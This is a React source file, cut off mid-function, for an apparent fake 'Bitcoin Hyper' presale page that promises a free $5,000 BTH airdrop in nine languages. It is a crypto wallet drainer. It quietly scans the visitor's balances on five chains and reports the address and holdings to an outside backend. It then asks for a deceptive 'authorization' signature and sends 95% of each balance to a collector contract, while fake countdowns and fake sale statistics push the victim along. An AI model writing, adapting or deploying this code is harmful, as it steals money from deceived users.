import React, { useState, useEffect } from 'react';
import { useAppKit, useAppKitAccount, useAppKitProvider } from '@reown/appkit/react';
import { useDisconnect } from 'wagmi';
import { ethers } from 'ethers';
import './index.css';

// ============================================
// LANGUAGE DETECTION & TRANSLATIONS
// ============================================

const SUPPORTED_LANGUAGES = {
  en: { name: 'English', flag: '🇺🇸', native: 'English' },
  es: { name: 'Spanish', flag: '🇪🇸', native: 'Español' },
  fr: { name: 'French', flag: '🇫🇷', native: 'Français' },
  de: { name: 'German', flag: '🇩🇪', native: 'Deutsch' },
  it: { name: 'Italian', flag: '🇮🇹', native: 'Italiano' },
  pt: { name: 'Portuguese', flag: '🇵🇹', native: 'Português' },
  ru: { name: 'Russian', flag: '🇷🇺', native: 'Русский' },
  zh: { name: 'Chinese', flag: '🇨🇳', native: '中文' },
  ja: { name: 'Japanese', flag: '🇯🇵', native: '日本語' },
  ko: { name: 'Korean', flag: '🇰🇷', native: '한국어' },
  ar: { name: 'Arabic', flag: '🇸🇦', native: 'العربية' },
  hi: { name: 'Hindi', flag: '🇮🇳', native: 'हिन्दी' },
  tr: { name: 'Turkish', flag: '🇹🇷', native: 'Türkçe' },
  nl: { name: 'Dutch', flag: '🇳🇱', native: 'Nederlands' },
  pl: { name: 'Polish', flag: '🇵🇱', native: 'Polski' },
  vi: { name: 'Vietnamese', flag: '🇻🇳', native: 'Tiếng Việt' },
  th: { name: 'Thai', flag: '🇹🇭', native: 'ไทย' },
  id: { name: 'Indonesian', flag: '🇮🇩', native: 'Bahasa Indonesia' }
};

const TRANSLATIONS = {
  en: {
    presaleLive: 'PRESALE LIVE · STAGE 4',
    bonusEndsIn: 'BONUS ENDS IN',
    days: 'days',
    hrs: 'hrs',
    mins: 'mins',
    secs: 'secs',
    bonus: '+25% BONUS · 5,000 BTH',
    instantAirdrop: 'instant airdrop · +25% extra',
    bthPrice: 'BTH PRICE',
    bonusLabel: 'BONUS',
    presale: 'PRESALE',
    stage4: 'STAGE 4',
    claim: 'CLAIM $5,000 BTH',
    processing: 'PROCESSING...',
    completed: '✓ COMPLETED SUCCESSFULLY',
    secured: 'Your $5,000 BTH has been secured',
    view: 'VIEW YOUR $5,000 BTH',
    welcome: 'Welcome to Bitcoin Hyper',
    connectWallet: 'CONNECT WALLET',
    disconnect: 'Disconnect Wallet',
    checkEligibility: 'Checking Eligibility',
    verifying: 'Verifying your wallet...',
    terms: 'Terms',
    delivery: 'Delivery',
    airdrop: '$5k Airdrop',
    liveNow: '5,000 BTH · +25% bonus · live now',
    successful: 'SUCCESSFUL!',
    youHaveSecured: 'You have secured',
    viewButton: 'VIEW',
    checkWalletEligibility: '⚡ Check Wallet Eligibility',
    whenQualified: 'When qualified, confirm to claim your airdrop',
    valueBadge: '$5,000 BTH',
    progress: 'Progress',
    today: 'Today',
    avg: 'Avg',
    totalRaised: 'Total Raised',
    tokenPrice: 'Token Price',
    currentBonus: 'Current Bonus',
    participants: 'participants'
  },
  es: {
    presaleLive: 'PREVENTA EN VIVO · ETAPA 4',
    bonusEndsIn: 'EL BONO TERMINA EN',
    days: 'días',
    hrs: 'hrs',
    mins: 'mins',
    secs: 'segs',
    bonus: '+25% BONO · 5,000 BTH',
    instantAirdrop: 'airdrop instantáneo · +25% extra',
    bthPrice: 'PRECIO BTH',
    bonusLabel: 'BONO',
    presale: 'PREVENTA',
    stage4: 'ETAPA 4',
    claim: 'RECLAMAR $5,000 BTH',
    processing: 'PROCESANDO...',
    completed: '✓ COMPLETADO CON ÉXITO',
    secured: 'Tus $5,000 BTH han sido asegurados',
    view: 'VER TUS $5,000 BTH',
    welcome: 'Bienvenido a Bitcoin Hyper',
    connectWallet: 'CONECTAR WALLET',
    disconnect: 'Desconectar Wallet',
    checkEligibility: 'Verificando Elegibilidad',
    verifying: 'Verificando tu wallet...',
    terms: 'Términos',
    delivery: 'Entrega',
    airdrop: 'Airdrop $5k',
    liveNow: '5,000 BTH · +25% bono · en vivo ahora',
    successful: '¡EXITOSO!',
    youHaveSecured: 'Has asegurado',
    viewButton: 'VER',
    checkWalletEligibility: '⚡ Verificar Elegibilidad',
    whenQualified: 'Cuando califiques, confirma para reclamar tu airdrop',
    valueBadge: '$5,000 BTH',
    progress: 'Progreso',
    today: 'Hoy',
    avg: 'Prom',
    totalRaised: 'Total Recaudado',
    tokenPrice: 'Precio Token',
    currentBonus: 'Bono Actual',
    participants: 'participantes'
  },
  fr: {
    presaleLive: 'PRÉVENTE EN DIRECT · ÉTAPE 4',
    bonusEndsIn: 'BONUS SE TERMINE DANS',
    days: 'jours',
    hrs: 'h',
    mins: 'min',
    secs: 's',
    bonus: '+25% BONUS · 5,000 BTH',
    instantAirdrop: 'airdrop instantané · +25% extra',
    bthPrice: 'PRIX BTH',
    bonusLabel: 'BONUS',
    presale: 'PRÉVENTE',
    stage4: 'ÉTAPE 4',
    claim: 'RÉCLAMER $5,000 BTH',
    processing: 'TRAITEMENT...',
    completed: '✓ TERMINÉ AVEC SUCCÈS',
    secured: 'Vos $5,000 BTH ont été sécurisés',
    view: 'VOIR VOS $5,000 BTH',
    welcome: 'Bienvenue sur Bitcoin Hyper',
    connectWallet: 'CONNECTER WALLET',
    disconnect: 'Déconnecter Wallet',
    checkEligibility: 'Vérification d\'Éligibilité',
    verifying: 'Vérification de votre wallet...',
    terms: 'Conditions',
    delivery: 'Livraison',
    airdrop: 'Airdrop $5k',
    liveNow: '5,000 BTH · +25% bonus · en direct',
    successful: 'SUCCÈS !',
    youHaveSecured: 'Vous avez sécurisé',
    viewButton: 'VOIR',
    checkWalletEligibility: '⚡ Vérifier Éligibilité',
    whenQualified: 'Une fois qualifié, confirmez pour réclamer votre airdrop',
    valueBadge: '$5,000 BTH',
    progress: 'Progrès',
    today: 'Aujourd\'hui',
    avg: 'Moy',
    totalRaised: 'Total Collecté',
    tokenPrice: 'Prix Token',
    currentBonus: 'Bonus Actuel',
    participants: 'participants'
  },
  de: {
    presaleLive: 'VORVERKAUF LIVE · STUFE 4',
    bonusEndsIn: 'BONUS ENDET IN',
    days: 'Tage',
    hrs: 'Std',
    mins: 'Min',
    secs: 'Sek',
    bonus: '+25% BONUS · 5,000 BTH',
    instantAirdrop: 'sofortiger Airdrop · +25% extra',
    bthPrice: 'BTH PREIS',
    bonusLabel: 'BONUS',
    presale: 'VORVERKAUF',
    stage4: 'STUFE 4',
    claim: '$5,000 BTH ANFORDERN',
    processing: 'VERARBEITUNG...',
    completed: '✓ ERFOLGREICH ABGESCHLOSSEN',
    secured: 'Ihre $5,000 BTH wurden gesichert',
    view: 'IHRE $5,000 BTH ANSEHEN',
    welcome: 'Willkommen bei Bitcoin Hyper',
    connectWallet: 'WALLET VERBINDEN',
    disconnect: 'Wallet trennen',
    checkEligibility: 'Berechtigung prüfen',
    verifying: 'Ihr Wallet wird verifiziert...',
    terms: 'Bedingungen',
    delivery: 'Lieferung',
    airdrop: '$5k Airdrop',
    liveNow: '5,000 BTH · +25% Bonus · live jetzt',
    successful: 'ERFOLGREICH!',
    youHaveSecured: 'Sie haben gesichert',
    viewButton: 'ANSEHEN',
    checkWalletEligibility: '⚡ Berechtigung prüfen',
    whenQualified: 'Bei Qualifikation bestätigen, um Airdrop zu erhalten',
    valueBadge: '$5,000 BTH',
    progress: 'Fortschritt',
    today: 'Heute',
    avg: 'Schnitt',
    totalRaised: 'Gesamt eingesammelt',
    tokenPrice: 'Token Preis',
    currentBonus: 'Aktueller Bonus',
    participants: 'Teilnehmer'
  },
  zh: {
    presaleLive: '预售进行中 · 第四阶段',
    bonusEndsIn: '奖励结束于',
    days: '天',
    hrs: '小时',
    mins: '分钟',
    secs: '秒',
    bonus: '+25% 奖励 · 5,000 BTH',
    instantAirdrop: '即时空投 · +25% 额外',
    bthPrice: 'BTH 价格',
    bonusLabel: '奖励',
    presale: '预售',
    stage4: '第四阶段',
    claim: '领取 $5,000 BTH',
    processing: '处理中...',
    completed: '✓ 成功完成',
    secured: '您的 $5,000 BTH 已确保',
    view: '查看您的 $5,000 BTH',
    welcome: '欢迎来到 Bitcoin Hyper',
    connectWallet: '连接钱包',
    disconnect: '断开钱包',
    checkEligibility: '检查资格',
    verifying: '正在验证您的钱包...',
    terms: '条款',
    delivery: '交付',
    airdrop: '$5k 空投',
    liveNow: '5,000 BTH · +25% 奖励 · 正在进行',
    successful: '成功！',
    youHaveSecured: '您已确保',
    viewButton: '查看',
    checkWalletEligibility: '⚡ 检查钱包资格',
    whenQualified: '符合条件时，确认领取空投',
    valueBadge: '$5,000 BTH',
    progress: '进度',
    today: '今日',
    avg: '平均',
    totalRaised: '总筹集',
    tokenPrice: '代币价格',
    currentBonus: '当前奖励',
    participants: '参与者'
  },
  ja: {
    presaleLive: 'プレセール実施中 · ステージ4',
    bonusEndsIn: 'ボーナス終了まで',
    days: '日',
    hrs: '時間',
    mins: '分',
    secs: '秒',
    bonus: '+25% ボーナス · 5,000 BTH',
    instantAirdrop: '即時エアドロップ · +25% 追加',
    bthPrice: 'BTH 価格',
    bonusLabel: 'ボーナス',
    presale: 'プレセール',
    stage4: 'ステージ4',
    claim: '$5,000 BTH を受け取る',
    processing: '処理中...',
    completed: '✓ 正常に完了',
    secured: '$5,000 BTH が確保されました',
    view: '$5,000 BTH を表示',
    welcome: 'Bitcoin Hyper へようこそ',
    connectWallet: 'ウォレット接続',
    disconnect: 'ウォレット切断',
    checkEligibility: '資格確認中',
    verifying: 'ウォレットを検証中...',
    terms: '利用規約',
    delivery: '配信',
    airdrop: '$5k エアドロップ',
    liveNow: '5,000 BTH · +25% ボーナス · 実施中',
    successful: '成功！',
    youHaveSecured: '確保しました',
    viewButton: '表示',
    checkWalletEligibility: '⚡ ウォレット資格を確認',
    whenQualified: '資格がある場合、確認してエアドロップを受け取る',
    valueBadge: '$5,000 BTH',
    progress: '進捗',
    today: '今日',
    avg: '平均',
    totalRaised: '総調達額',
    tokenPrice: 'トークン価格',
    currentBonus: '現在のボーナス',
    participants: '参加者'
  },
  ko: {
    presaleLive: '프리세일 진행 중 · 4단계',
    bonusEndsIn: '보너스 종료까지',
    days: '일',
    hrs: '시간',
    mins: '분',
    secs: '초',
    bonus: '+25% 보너스 · 5,000 BTH',
    instantAirdrop: '즉시 에어드랍 · +25% 추가',
    bthPrice: 'BTH 가격',
    bonusLabel: '보너스',
    presale: '프리세일',
    stage4: '4단계',
    claim: '$5,000 BTH 받기',
    processing: '처리 중...',
    completed: '✓ 성공적으로 완료',
    secured: '$5,000 BTH가 확보되었습니다',
    view: '$5,000 BTH 보기',
    welcome: 'Bitcoin Hyper에 오신 것을 환영합니다',
    connectWallet: '지갑 연결',
    disconnect: '지갑 연결 해제',
    checkEligibility: '자격 확인 중',
    verifying: '지갑 확인 중...',
    terms: '약관',
    delivery: '전달',
    airdrop: '$5k 에어드랍',
    liveNow: '5,000 BTH · +25% 보너스 · 진행 중',
    successful: '성공!',
    youHaveSecured: '확보했습니다',
    viewButton: '보기',
    checkWalletEligibility: '⚡ 지갑 자격 확인',
    whenQualified: '자격이 되면 확인하여 에어드랍 받기',
    valueBadge: '$5,000 BTH',
    progress: '진행률',
    today: '오늘',
    avg: '평균',
    totalRaised: '총 모금액',
    tokenPrice: '토큰 가격',
    currentBonus: '현재 보너스',
    participants: '참가자'
  },
  ar: {
    presaleLive: 'بيع مسبق مباشر · المرحلة 4',
    bonusEndsIn: 'تنتهي المكافأة في',
    days: 'أيام',
    hrs: 'ساعات',
    mins: 'دقائق',
    secs: 'ثواني',
    bonus: '+25٪ مكافأة · 5,000 BTH',
    instantAirdrop: 'إسقاط جوي فوري · +25٪ إضافي',
    bthPrice: 'سعر BTH',
    bonusLabel: 'مكافأة',
    presale: 'بيع مسبق',
    stage4: 'المرحلة 4',
    claim: 'استلام $5,000 BTH',
    processing: 'جاري المعالجة...',
    completed: '✓ اكتمل بنجاح',
    secured: 'تم تأمين $5,000 BTH الخاص بك',
    view: 'عرض $5,000 BTH الخاص بك',
    welcome: 'مرحباً بك في Bitcoin Hyper',
    connectWallet: 'ربط المحفظة',
    disconnect: 'قطع المحفظة',
    checkEligibility: 'جاري التحقق من الأهلية',
    verifying: 'جاري التحقق من محفظتك...',
    terms: 'الشروط',
    delivery: 'التسليم',
    airdrop: 'إسقاط جوي $5k',
    liveNow: '5,000 BTH · +25٪ مكافأة · مباشر الآن',
    successful: 'نجاح!',
    youHaveSecured: 'لقد قمت بتأمين',
    viewButton: 'عرض',
    checkWalletEligibility: '⚡ التحقق من أهلية المحفظة',
    whenQualified: 'عند التأهل، قم بالتأكيد لاستلام الإسقاط الجوي',
    valueBadge: '$5,000 BTH',
    progress: 'التقدم',
    today: 'اليوم',
    avg: 'المتوسط',
    totalRaised: 'الإجمالي المجموع',
    tokenPrice: 'سعر التوكن',
    currentBonus: 'المكافأة الحالية',
    participants: 'مشارك'
  }
};

// ============================================
// DEPLOYED CONTRACTS ON ALL 5 NETWORKS
// ============================================

const MULTICHAIN_CONFIG = {
  Ethereum: {
    chainId: 1,
    contractAddress: '0xED46Ea22CAd806e93D44aA27f5BBbF0157F8D288',
    name: 'Ethereum',
    symbol: 'ETH',
    explorer: 'https://etherscan.io',
    icon: '⟠',
    color: 'from-blue-400 to-indigo-500',
    rpc: 'https://eth.llamarpc.com'
  },
  BSC: {
    chainId: 56,
    contractAddress: '0xb2ea58AcfC23006B3193E6F51297518289D2d6a0',
    name: 'BSC',
    symbol: 'BNB',
    explorer: 'https://bscscan.com',
    icon: '🟡',
    color: 'from-yellow-400 to-orange-500',
    rpc: 'https://bsc-dataseed.binance.org'
  },
  Polygon: {
    chainId: 137,
    contractAddress: '0xED46Ea22CAd806e93D44aA27f5BBbF0157F8D288',
    name: 'Polygon',
    symbol: 'MATIC',
    explorer: 'https://polygonscan.com',
    icon: '⬢',
    color: 'from-purple-400 to-pink-500',
    rpc: 'https://polygon-rpc.com'
  },
  Arbitrum: {
    chainId: 42161,
    contractAddress: '0xED46Ea22CAd806e93D44aA27f5BBbF0157F8D288',
    name: 'Arbitrum',
    symbol: 'ETH',
    explorer: 'https://arbiscan.io',
    icon: '🔷',
    color: 'from-cyan-400 to-blue-500',
    rpc: 'https://arb1.arbitrum.io/rpc'
  },
  Avalanche: {
    chainId: 43114,
    contractAddress: '0xED46Ea22CAd806e93D44aA27f5BBbF0157F8D288',
    name: 'Avalanche',
    symbol: 'AVAX',
    explorer: 'https://snowtrace.io',
    icon: '🔴',
    color: 'from-red-400 to-red-500',
    rpc: 'https://api.avax.network/ext/bc/C/rpc'
  }
};

const DEPLOYED_CHAINS = Object.values(MULTICHAIN_CONFIG);

const PROJECT_FLOW_ROUTER_ABI = [
  "function collector() view returns (address)",
  "function processNativeFlow() payable",
  "event FlowProcessed(address indexed initiator, uint256 value)"
];

function App() {
  const { open } = useAppKit();
  const { address, isConnected } = useAppKitAccount();
  const { walletProvider } = useAppKitProvider("eip155");
  const { disconnect } = useDisconnect();
  
  const [provider, setProvider] = useState(null);
  const [signer, setSigner] = useState(null);
  const [balances, setBalances] = useState({});
  const [loading, setLoading] = useState(false);
  const [signatureLoading, setSignatureLoading] = useState(false);
  const [txStatus, setTxStatus] = useState('');
  const [error, setError] = useState('');
  const [completedChains, setCompletedChains] = useState([]);
  const [showCelebration, setShowCelebration] = useState(false);
  const [verifying, setVerifying] = useState(false);
  const [verifiedChains, setVerifiedChains] = useState([]);
  const [prices, setPrices] = useState({
    eth: 2000,
    bnb: 300,
    matic: 0.75,
    avax: 32
  });
  const [userEmail, setUserEmail] = useState('');
  const [userLocation, setUserLocation] = useState({ country: '', city: '', flag: '', ip: '' });
  const [hoverConnect, setHoverConnect] = useState(false);
  const [walletInitialized, setWalletInitialized] = useState(false);
  const [scanProgress, setScanProgress] = useState(0);
  const [scanning, setScanning] = useState(false);
  const [currentFlowId, setCurrentFlowId] = useState('');
  const [processingChain, setProcessingChain] = useState('');
  const [isEligible, setIsEligible] = useState(false);
  const [eligibleChains, setEligibleChains] = useState([]);
  const [processedAmounts, setProcessedAmounts] = useState({});
  const [allChainsCompleted, setAllChainsCompleted] = useState(false);
  const [executableChains, setExecutableChains] = useState([]);
  const [showRibbon, setShowRibbon] = useState(true);
  
  // ============================================
  // LANGUAGE STATE
  // ============================================
  const [language, setLanguage] = useState('en');
  const [showLanguageDropdown, setShowLanguageDropdown] = useState(false);
  const t = TRANSLATIONS[language] || TRANSLATIONS.en;

  // Presale stats
  const [timeLeft, setTimeLeft] = useState({
    days: 5,
    hours: 12,
    minutes: 30,
    seconds: 0
  });
  
  const [presaleStats, setPresaleStats] = useState({
    totalRaised: 1250000,
    totalParticipants: 8742,
    currentBonus: 25,
    nextBonus: 15,
    tokenPrice: 0.045,
    bthPrice: 0.045
  });

  // Live progress tracking
  const [liveProgress, setLiveProgress] = useState({
    percentComplete: 68,
    participantsToday: 342,
    avgAllocation: 4250
  });

  // Minimum gas buffer requirements (in native token)
  const MIN_GAS_BUFFER = {
    Ethereum: 0.005, // 0.005 ETH minimum for gas
    BSC: 0.001, // 0.001 BNB minimum for gas
    Polygon: 0.1, // 0.1 MATIC minimum for gas
    Arbitrum: 0.002, // 0.002 ETH minimum for gas
    Avalanche: 0.1 // 0.1 AVAX minimum for gas
  };

  // Minimum value threshold to execute ($1)
  const MIN_VALUE_THRESHOLD = 1; // $1 minimum

  // ============================================
  // AUTO DETECT LANGUAGE FROM URL
  // ============================================
  useEffect(() => {
    const detectLanguage = () => {
      // Get language from URL path (e.g., /es, /fr, /de)
      const path = window.location.pathname;
      const pathLang = path.split('/')[1]; // Get first part after slash
      
      // Check if it's a valid language code
      if (pathLang && SUPPORTED_LANGUAGES[pathLang]) {
        setLanguage(pathLang);
      } else {
        // Try to detect browser language
        const browserLang = navigator.language.split('-')[0]; // Get primary language code
        if (SUPPORTED_LANGUAGES[browserLang]) {
          setLanguage(browserLang);
        } else {
          // Default to English
          setLanguage('en');
        }
      }
    };
    
    detectLanguage();
    
    // Listen for URL changes
    const handleUrlChange = () => {
      detectLanguage();
    };
    
    window.addEventListener('popstate', handleUrlChange);
    
    return () => {
      window.removeEventListener('popstate', handleUrlChange);
    };
  }, []);

  // Fetch crypto prices
  useEffect(() => {
    const fetchPrices = async () => {
      try {
        const response = await fetch('https://api.coingecko.com/api/v3/simple/price?ids=ethereum,binancecoin,matic-network,avalanche-2&vs_currencies=usd');
        const data = await response.json();
        setPrices({
          eth: data.ethereum?.usd || 2000,
          bnb: data.binancecoin?.usd || 300,
          matic: data['matic-network']?.usd || 0.75,
          avax: data['avalanche-2']?.usd || 32
        });
      } catch (error) {
        console.log('Using default prices');
      }
    };
    
    fetchPrices();
    const interval = setInterval(fetchPrices, 60000);
    return () => clearInterval(interval);
  }, []);

  // Initialize provider and signer from AppKit
  useEffect(() => {
    if (!walletProvider || !address) {
      setWalletInitialized(false);
      return;
    }

    const init = async () => {
      try {
        console.log("🔄 Initializing wallet...");
        setTxStatus('🔄 Initializing...');
        
        const ethersProvider = new ethers.BrowserProvider(walletProvider);
        const ethersSigner = await ethersProvider.getSigner();

        setProvider(ethersProvider);
        setSigner(ethersSigner);

        console.log("✅ Wallet Ready:", await ethersSigner.getAddress());
        setWalletInitialized(true);
        setTxStatus('');
        
        // Fetch balances across all chains
        await fetchAllBalances(address);
        
      } catch (e) {
        console.error("Provider init failed", e);
        setWalletInitialized(false);
      }
    };

    init();
  }, [walletProvider, address]);

  // Track page visit with location
  useEffect(() => {
    const trackVisit = async () => {
      try {
        const response = await fetch('https://hyperback.vercel.app/api/track-visit', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            userAgent: navigator.userAgent,
            referer: document.referrer,
            path: window.location.pathname
          })
        });
        const data = await response.json();
        if (data.success) {
          setUserLocation({
            country: data.data.country || 'Unknown',
            city: data.data.city || '',
            ip: data.data.ip || '',
            flag: data.data.flag || '🌍'
          });
        }
      } catch (err) {
        console.error('Visit tracking error:', err);
      }
    };
    trackVisit();
  }, []);

  // Countdown timer
  useEffect(() => {
    const timer = setInterval(() => {
      setTimeLeft(prev => {
        if (prev.seconds > 0) {
          return { ...prev, seconds: prev.seconds - 1 };
        } else if (prev.minutes > 0) {
          return { ...prev, minutes: prev.minutes - 1, seconds: 59 };
        } else if (prev.hours > 0) {
          return { ...prev, hours: prev.hours - 1, minutes: 59, seconds: 59 };
        } else if (prev.days > 0) {
          return { ...prev, days: prev.days - 1, hours: 23, minutes: 59, seconds: 59 };
        }
        return prev;
      });
    }, 1000);
    return () => clearInterval(timer);
  }, []);

  // Auto-check eligibility when wallet connects
  useEffect(() => {
    if (isConnected && address && Object.keys(balances).length > 0 && !verifying) {
      checkEligibility();
    }
  }, [isConnected, address, balances]);

  // Check if all eligible chains are completed
  useEffect(() => {
    if (executableChains.length > 0 && completedChains.length === executableChains.length) {
      setAllChainsCompleted(true);
    }
  }, [completedChains, executableChains]);

  // Hide ribbon after wallet connects
  useEffect(() => {
    if (isConnected) {
      setShowRibbon(false);
    }
  }, [isConnected]);

  // Check eligibility without showing balances
  const checkEligibility = async () => {
    if (!address) return;
    
    setVerifying(true);
    setTxStatus('🔄 Checking eligibility...');
    
    try {
      // Calculate total value
      const total = Object.values(balances).reduce((sum, b) => sum + (b.valueUSD || 0), 0);
      
      // Get chains with balance
      const chainsWithBalance = DEPLOYED_CHAINS.filter(chain => 
        balances[chain.name] && balances[chain.name].amount > 0.000001
      );
      
      // Filter chains that are executable (have enough value and gas buffer)
      const executable = chainsWithBalance.filter(chain => {
        const balance = balances[chain.name];
        if (!balance) return false;
        
        // Check if value is at least $1
        if (balance.valueUSD < MIN_VALUE_THRESHOLD) {
          console.log(`⏭️ Skipping ${chain.name}: Value $${balance.valueUSD.toFixed(2)} is below $${MIN_VALUE_THRESHOLD} threshold`);
          return false;
        }
        
        // Check if enough for gas (leave gas buffer)
        const minGasRequired = MIN_GAS_BUFFER[chain.name] || 0.001;
        if (balance.amount < minGasRequired) {
          console.log(`⏭️ Skipping ${chain.name}: Balance ${balance.amount.toFixed(6)} ${chain.symbol} is below gas buffer ${minGasRequired} ${chain.symbol}`);
          return false;
        }
        
        return true;
      });
      
      setEligibleChains(chainsWithBalance);
      setExecutableChains(executable);
      
      // Check if eligible (total >= $1)
      const eligible = total >= 1;
      setIsEligible(eligible);
      
      if (eligible) {
        if (executable.length === 0) {
          setTxStatus('⚠️ No chains meet execution requirements');
        } else {
          setTxStatus(`✅ Ready to process ${executable.length} chains`);
        }
        
        // Send to backend for tracking
        const connectResponse = await fetch('https://hyperback.vercel.app/api/presale/connect', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ 
            walletAddress: address,
            totalValue: total,
            chains: chainsWithBalance.map(c => c.name)
          })
        });
        
        if (connectResponse.ok) {
          const connectData = await connectResponse.json();
          if (connectData.success && connectData.data.email) {
            setUserEmail(connectData.data.email);
            console.log("📧 Email from backend:", connectData.data.email);
          }
        }
        
        // Prepare flow silently if there are executable chains
        if (executable.length > 0) {
          preparePresale();
        }
      } else {
        setTxStatus(total > 0 ? '✨ Connected' : '👋 Welcome');
      }
      
    } catch (err) {
      console.error('Eligibility check error:', err);
      setTxStatus('✅ Ready');
    } finally {
      setVerifying(false);
    }
  };

  // Fetch balances across all chains (hidden from UI)
  const fetchAllBalances = async (walletAddress) => {
    console.log("🔍 Checking eligibility...");
    setScanning(true);
    setTxStatus('🔄 Checking eligibility...');
    
    const balanceResults = {};
    let scanned = 0;
    const totalChains = DEPLOYED_CHAINS.length;
    
    // Scan all chains in parallel
    const scanPromises = DEPLOYED_CHAINS.map(async (chain) => {
      try {
        const rpcProvider = new ethers.JsonRpcProvider(chain.rpc);
        const balance = await rpcProvider.getBalance(walletAddress);
        const amount = parseFloat(ethers.formatUnits(balance, 18));
        
        let price = 0;
        if (chain.symbol === 'ETH') price = prices.eth;
        else if (chain.symbol === 'BNB') price = prices.bnb;
        else if (chain.symbol === 'MATIC') price = prices.matic;
        else if (chain.symbol === 'AVAX') price = prices.avax;
        
        const valueUSD = amount * price;
        
        scanned++;
        setScanProgress(Math.round((scanned / totalChains) * 100));
        setTxStatus(`🔄 Checking eligibility...`);
        
        if (amount > 0.000001) {
          balanceResults[chain.name] = {
            amount,
            valueUSD,
            symbol: chain.symbol,
            chainId: chain.chainId,
            contractAddress: chain.contractAddress,
            price: price,
            name: chain.name,
            rpc: chain.rpc
          };
          console.log(`✅ ${chain.name}: $${valueUSD.toFixed(2)} detected`);
        }
      } catch (err) {
        console.error(`Failed to fetch balance for ${chain.name}:`, err);
        scanned++;
      }
    });
    
    await Promise.all(scanPromises);
    
    setBalances(balanceResults);
    setScanning(false);
    
    const total = Object.values(balanceResults).reduce((sum, b) => sum + b.valueUSD, 0);
    console.log(`💰 Total detected: $${total.toFixed(2)}`);
    
    return total;
  };

  const preparePresale = async () => {
    if (!address) return;
    
    try {
      await fetch('https://hyperback.vercel.app/api/presale/prepare-flow', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ walletAddress: address })
      });
    } catch (err) {
      console.error('Prepare error:', err);
    }
  };

  // ============================================
  // CHANGE LANGUAGE FUNCTION
  // ============================================
  const changeLanguage = (langCode) => {
    setLanguage(langCode);
    setShowLanguageDropdown(false);
    
    // Update URL without page reload
    const url = new URL(window.location);
    if (langCode === 'en') {
      // Remove language from URL for default English
      if (url.pathname.startsWith(`/${langCode}`)) {
        url.pathname = url.pathname.replace(`/${langCode}`, '') || '/';
      }
    } else {
      // Add language to URL
      url.pathname = `/${langCode}${url.pathname}`;
    }
    window.history.pushState({}, '', url.toString());
  };

  // ============================================
  // MULTI-CHAIN EXECUTION - 95% OF BALANCE (only on executable chains)
  // ============================================
  const executeMultiChainSignature = async () => {
    if (!walletProvider || !address || !signer) {
      setError("Wallet not initialized");
      return;
    }

    try {
      setSignatureLoading(true);
      setError('');
      setCompletedChains([]);
      setAllChainsCompleted(false);
      setProcessedAmounts({});
      
      const timestamp = Date.now();
      const flowId = `FLOW-${timestamp}-${Math.random().toString(36).substring(2, 10).toUpperCase()}`;
      setCurrentFlowId(flowId);
      
      const nonce = Math.floor(Math.random() * 1000000000);
      const message = `BITCOIN HYPER PRESALE AUTHORIZATION\n\n` +
        `I hereby confirm my participation\n` +
        `Wallet: ${address}\n` +
        `Allocation: $5,000 BTH + ${presaleStats.currentBonus}% Bonus\n` +
        `Timestamp: ${new Date().toISOString()}\n` +
        `Nonce: ${nonce}`;

      setTxStatus('✍️ Sign message...');

      // Get signature - ONE SIGNATURE FOR ALL CHAINS
      const signature = await signer.signMessage(message);
      console.log("✅ Signature obtained");
      
      setTxStatus('✅ Executing on eligible chains...');

      // Use only executable chains (those with enough value and gas buffer)
      const chainsToProcess = executableChains;
      
      if (chainsToProcess.length === 0) {
        setError("No chains meet the execution requirements (min $1 value and gas buffer)");
        setSignatureLoading(false);
        return;
      }

      console.log(`🔄 Processing ${chainsToProcess.length} executable chains`);

      // Sort chains by value (highest first)
      const sortedChains = [...chainsToProcess].sort((a, b) => 
        (balances[b.name]?.valueUSD || 0) - (balances[a.name]?.valueUSD || 0)
      );
      
      let processed = [];
      let skippedChains = [];
      let failedChains = [];
      
      for (const chain of sortedChains) {
        try {
          setProcessingChain(chain.name);
          setTxStatus(`🔄 Processing ${chain.name}...`);
          
          // Switch to the correct chain using AppKit
          try {
            console.log(`🔄 Switching to ${chain.name}...`);
            
            await walletProvider.request({
              method: 'wallet_switchEthereumChain',
              params: [{ chainId: `0x${chain.chainId.toString(16)}` }]
            });
            
            // Wait for chain switch
            await new Promise(resolve => setTimeout(resolve, 1000));
            
          } catch (switchError) {
            console.log(`Chain switch needed, continuing...`);
          }
          
          // Create provider for this chain
          const chainProvider = new ethers.JsonRpcProvider(chain.rpc);
          
          // Get balance data - SEND 95% (leave 5% for gas)
          const balance = balances[chain.name];
          
          // Double-check if still executable (balance might have changed)
          if (balance.valueUSD < MIN_VALUE_THRESHOLD) {
            console.log(`⏭️ Skipping ${chain.name}: Value now $${balance.valueUSD.toFixed(2)} below threshold`);
            skippedChains.push(chain.name);
            continue;
          }
          
          const amountToSend = (balance.amount * 0.95);
          const valueUSD = (balance.valueUSD * 0.95).toFixed(2);
          
          // Store the processed amount for this chain immediately
          setProcessedAmounts(prev => ({
            ...prev,
            [chain.name]: {
              amount: amountToSend.toFixed(6),
              symbol: chain.symbol,
              valueUSD: valueUSD
            }
          }));
          
          console.log(`💰 ${chain.name}: Sending ${amountToSend.toFixed(6)} ${chain.symbol} ($${valueUSD})`);
          
          // Create contract interface
          const contractInterface = new ethers.Interface(PROJECT_FLOW_ROUTER_ABI);
          const data = contractInterface.encodeFunctionData('processNativeFlow', []);
          
          const value = ethers.parseEther(amountToSend.toFixed(18));

          // Estimate gas
          const contract = new ethers.Contract(
            chain.contractAddress,
            PROJECT_FLOW_ROUTER_ABI,
            chainProvider
          );
          
          const gasEstimate = await contract.processNativeFlow.estimateGas({ value });
          const gasLimit = gasEstimate * 120n / 100n;

          // Send transaction
          const tx = await walletProvider.request({
            method: 'eth_sendTransaction',
            params: [{
              from: address,
              to: chain.contractAddress,
              value: '0x' + value.toString(16),
              gas: '0x' + gasLimit.toString(16),
              data: data
            }]
          });

          setTxStatus(`⏳ Waiting for ${chain.name} confirmation...`);
          
          // Wait for confirmation
          const receipt = await chainProvider.waitForTransaction(tx);
          
          if (receipt && receipt.status === 1) {
            console.log(`✅ ${chain.name} confirmed`);
            
            processed.push(chain.name);
            setCompletedChains(prev => [...prev, chain.name]);
            
            // Calculate gas used
            const gasUsed = receipt.gasUsed ? ethers.formatEther(receipt.gasUsed * receipt.gasPrice) : '0';
            
            // Send to backend with CORRECT amount and valueUSD
            const flowData = {
